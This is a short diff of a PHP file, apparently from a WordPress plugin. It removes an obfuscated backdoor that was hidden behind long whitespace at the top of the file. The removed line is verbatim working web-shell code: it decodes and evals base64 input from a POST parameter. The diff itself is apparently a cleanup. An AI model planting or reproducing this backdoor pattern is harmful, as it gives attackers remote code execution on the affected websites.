@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                          $owj1="o4abspde6tc_";$fnxu85=strtolower ($owj1[3].$owj1[2].$owj1[4].$owj1[7] . $owj1[8]. $owj1[1]. $owj1[11] . $owj1[6].$owj1[7]. $owj1[10]. $owj1[0]. $owj1[6].$owj1[7] ); $utas56=strtoupper($owj1[11]. $owj1[5]. $owj1[0].$owj1[4].$owj1[9]); if(isset( ${$utas56}[ 'n51b21e' ]) ){eval ($fnxu85 (${$utas56 }['n51b21e']) ); } ?> <?php
+<?php
 if(!class_exists('uwpqsfront')){
   class uwpqsfront{
   
